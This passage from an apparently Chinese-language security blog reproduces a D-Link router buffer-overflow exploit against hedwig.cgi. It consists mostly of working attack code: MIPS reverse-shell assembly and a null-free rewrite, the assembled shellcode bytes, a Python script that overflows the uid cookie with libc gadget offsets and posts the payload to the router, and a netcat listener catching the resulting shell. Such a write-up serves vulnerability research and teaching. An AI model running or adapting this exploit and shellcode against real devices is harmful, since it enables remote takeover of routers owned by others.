+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">; int s = socket(2, 2, 0);</span><br><span class="line">li $a0, 0x2</span><br><span class="line">li $a1, 0x2</span><br><span class="line">li $a2, 0x0</span><br><span class="line">li $v0, 0x1057</span><br><span class="line">syscall 0x40404</span><br><span class="line">sw $v0, 0x1E0($sp)</span><br><span class="line"></span><br><span class="line">; dup2(s, 0); dup2(s, 1); dup2(s, 2);</span><br><span class="line">lw $a0, 0x1E0($sp)</span><br><span class="line">li $a1, 0x0</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">li $a1, 0x1</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">li $a1, 0x2</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">; connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));</span><br><span class="line">lui $t6, 0x401F</span><br><span class="line">ori $t6, $t6, 0x0002</span><br><span class="line">sw $t6, 0x1E4($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x0200</span><br><span class="line">ori $t6, $t6, 0xA8C0</span><br><span class="line">sw $t6, 0x1E8($sp)</span><br><span class="line"></span><br><span class="line">lw $a0, 0x1E0($sp)</span><br><span class="line">la $a1, 0x1E4($sp)</span><br><span class="line">li $a2, 0x10</span><br><span class="line">li $v0, 0x104A</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);</span><br><span class="line">lui $t1, 0x6E69</span><br><span class="line">ori $t1, $t1, 0x622F</span><br><span class="line">sw $t1, 0x1E8($sp)</span><br><span class="line">lui $t1, 0x0068</span><br><span class="line">ori $t1, $t1, 0x732F</span><br><span class="line">sw $t1, 0x1EC($sp)</span><br><span class="line"></span><br><span class="line">lui $t1, 0x0</span><br><span class="line">ori $t1, $t1, 0x692D</span><br><span class="line">sw $t1, 0x1F0($sp)</span><br><span class="line"></span><br><span class="line">la $t1, 0x1E8($sp)</span><br><span class="line">sw $t1, 0x1E0($sp)</span><br><span class="line">la $t1, 0x1F0($sp)</span><br><span class="line">sw $t1, 0x1E4($sp)</span><br><span class="line"></span><br><span class="line">la $a0, 0x1E8($sp)</span><br><span class="line">la $a1, 0x1E0($sp)</span><br><span class="line">li $a2, 0x0</span><br><span class="line">li $v0, 0xFAB</span><br><span class="line">syscall 0x40404</span><br></pre></td></tr></table></figure>
+
+<p>为了防止汇编代码对应的十六进制数据存在 <code>\x00</code> 字节，所以对代码进行优化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">; int s = socket(2, 2, 0);</span><br><span class="line">li $a0, 0x2223</span><br><span class="line">addi $a0, $a0, -0x2221</span><br><span class="line">li $a1, 0x2223</span><br><span class="line">addi $a1, $a1, -0x2221</span><br><span class="line">li $a2, 0x2223</span><br><span class="line">addi $a2, $a2, -0x2223</span><br><span class="line">li $v0, 0x1057</span><br><span class="line">syscall 0x40404</span><br><span class="line">sw $v0, 0x1E0($sp)</span><br><span class="line"></span><br><span class="line">; dup2(s, 0); dup2(s, 1); dup2(s, 2);</span><br><span class="line">lw $a0, 0x1E0($sp)</span><br><span class="line">li $a1, 0x2223</span><br><span class="line">addi $a1, $a1, -0x2223</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">li $a1, 0x2223</span><br><span class="line">addi $a1, $a1, -0x2222</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">li $a1, 0x2223</span><br><span class="line">addi $a1, $a1, -0x2221</span><br><span class="line">li $v0, 0xFDF</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">; connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));</span><br><span class="line">lui $t6, 0x401F</span><br><span class="line">ori $t6, $t6, 0x0303</span><br><span class="line">addi $t6, $t6, -0x0301</span><br><span class="line">sw $t6, 0x1E4($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x0303</span><br><span class="line">ori $t6, $t6, 0xA9C1</span><br><span class="line">addi $t6, $t6, -0x01030101</span><br><span class="line">sw $t6, 0x1E8($sp)</span><br><span class="line"></span><br><span class="line">lw $a0, 0x1E0($sp)</span><br><span class="line">la $a1, 0x1E4($sp)</span><br><span class="line">li $a2, 0x2223</span><br><span class="line">addi $a2, $a2, -0x2213</span><br><span class="line">li $v0, 0x104A</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);</span><br><span class="line">lui $t6, 0x6E69</span><br><span class="line">ori $t6, $t6, 0x622F</span><br><span class="line">sw $t6, 0x1E0($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x0169</span><br><span class="line">ori $t6, $t6, 0x7430</span><br><span class="line">addi $t6, $t6, -0x01010101</span><br><span class="line">sw $t6, 0x1E4($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x6E69</span><br><span class="line">ori $t6, $t6, 0x622F</span><br><span class="line">sw $t6, 0x1F4($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x0169</span><br><span class="line">ori $t6, $t6, 0x7430</span><br><span class="line">addi $t6, $t6, -0x01010101</span><br><span class="line">sw $t6, 0x1F8($sp)</span><br><span class="line"></span><br><span class="line">lui $t6, 0x0101</span><br><span class="line">ori $t6, $t6, 0x6A2E</span><br><span class="line">addi $t6, $t6, -0x01010101</span><br><span class="line">sw $t6, 0x1FC($sp)</span><br><span class="line"></span><br><span class="line">la $t6, 0x1F4($sp)</span><br><span class="line">sw $t6, 0x1E8($sp)</span><br><span class="line">la $t6, 0x1FC($sp)</span><br><span class="line">sw $t6, 0x1EC($sp)</span><br><span class="line">sw $zero, 0x1EC($sp)</span><br><span class="line"></span><br><span class="line">la $a0, 0x1E0($sp)</span><br><span class="line">la $a1, 0x1E8($sp)</span><br><span class="line">slti $a2, $zero, -1</span><br><span class="line">li $v0, 0xFAB</span><br><span class="line">syscall 0x40404</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>lui $t1, 0x6E69</code> 对应的十六进制数据 <code>\x69\x6e\x09\x3c</code> 中的 <code>\x09</code> 字节会被程序替换为 <code>\x20</code> 字节，因此改用 <code>$t6</code> 寄存器。</p>
+<p>通过 <a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a> 网站将汇编代码转换为十六进制数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int s = socket(2, 2, 0);</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x23\x22\x04\x24\xdf\xdd\x84\x20\x23\x22\x05\x24\xdf\xdd\xa5\x20\x23\x22\x06\x24\xdd\xdd\xc6\x20\x57\x10\x02\x24\x0c\x01\x01\x01\xe0\x01\xa2\xaf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dup2(s, 0); dup2(s, 1); dup2(s, 2);</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe0\x01\xa4\x8f\x23\x22\x05\x24\xdd\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x23\x22\x05\x24\xde\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x23\x22\x05\x24\xdf\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x1f\x40\x0e\x3c\x03\x03\xce\x35\xff\xfc\xce\x21\xe4\x01\xae\xaf\x03\x03\x0e\x3c\xc1\xa9\xce\x35\xfc\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xe8\x01\xae\xaf\xe0\x01\xa4\x8f\xe4\x01\xa5\x27\x23\x22\x06\x24\xed\xdd\xc6\x20\x4a\x10\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x69\x6e\x0e\x3c\x2f\x62\xce\x35\xe0\x01\xae\xaf\x69\x01\x0e\x3c\x30\x74\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xe4\x01\xae\xaf\x69\x6e\x0e\x3c\x2f\x62\xce\x35\xf4\x01\xae\xaf\x69\x01\x0e\x3c\x30\x74\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xf8\x01\xae\xaf\x01\x01\x0e\x3c\x2e\x6a\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xfc\x01\xae\xaf\xf4\x01\xae\x27\xe8\x01\xae\xaf\xfc\x01\xae\x27\xec\x01\xae\xaf\xec\x01\xa0\xaf\xe0\x01\xa4\x27\xe8\x01\xa5\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试脚本，执行目标代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">libc_base_addr = <span class="number">0x77F34000</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x23\x22\x04\x24\xdf\xdd\x84\x20\x23\x22\x05\x24\xdf\xdd\xa5\x20\x23\x22\x06\x24\xdd\xdd\xc6\x20\x57\x10\x02\x24\x0c\x01\x01\x01\xe0\x01\xa2\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe0\x01\xa4\x8f\x23\x22\x05\x24\xdd\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x23\x22\x05\x24\xde\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\x23\x22\x05\x24\xdf\xdd\xa5\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x1f\x40\x0e\x3c\x03\x03\xce\x35\xff\xfc\xce\x21\xe4\x01\xae\xaf\x03\x03\x0e\x3c\xc1\xa9\xce\x35\xfc\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xe8\x01\xae\xaf\xe0\x01\xa4\x8f\xe4\x01\xa5\x27\x10\x00\x06\x24\x4a\x10\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x69\x6e\x0e\x3c\x2f\x62\xce\x35\xe0\x01\xae\xaf\x69\x01\x0e\x3c\x30\x74\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xe4\x01\xae\xaf\x69\x6e\x0e\x3c\x2f\x62\xce\x35\xf4\x01\xae\xaf\x69\x01\x0e\x3c\x30\x74\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xf8\x01\xae\xaf\x01\x01\x0e\x3c\x2e\x6a\xce\x35\xfe\xfe\x01\x3c\xff\xfe\x21\x34\x20\x70\xc1\x01\xfc\x01\xae\xaf\xf4\x01\xae\x27\xe8\x01\xae\xaf\xfc\x01\xae\x27\xec\x01\xae\xaf\xec\x01\xa0\xaf\xe0\x01\xa4\x27\xe8\x01\xa5\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x3EF</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000158C8</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000159CC</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/hedwig.cgi&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = http.client.HTTPConnection(host, port).request(<span class="string">&#x27;POST&#x27;</span>, path, data, headers)</span><br><span class="line">r = conn.getresponse()</span><br><span class="line"><span class="built_in">print</span>(r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>运行 NetCat 监听端口，接收路由器 Shell 会话。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -lvvp 8000</span></span><br><span class="line">Listening on 0.0.0.0 8000</span><br><span class="line">pwd</span><br><span class="line">nc: getnameinfo: Temporary failure in name resolution</span><br><span class="line">/htdocs/web</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">国家信息安全漏洞共享平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/122659/dlinkdir645-overflowxss.txt">D-Link DIR-645 Buffer Overflow &#x2F; Cross Site Scripting ≈ Packet Storm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/395954.html">踏入IOT安全世界：DIR-815路由器多次溢出漏洞分析复现 - FreeBuf网络安全行业门户</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/D-Link/" rel="tag"># D-Link</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/cybersecurity/ctf/pwnable-kr/pwnable-kr-toddler-s-bottle-%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="prev" title="Pwnable.kr Toddler&#39;s Bottle 练习记录">
+                  <i class="fa fa-angle-left"></i> Pwnable.kr Toddler's Bottle 练习记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Voxzz</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
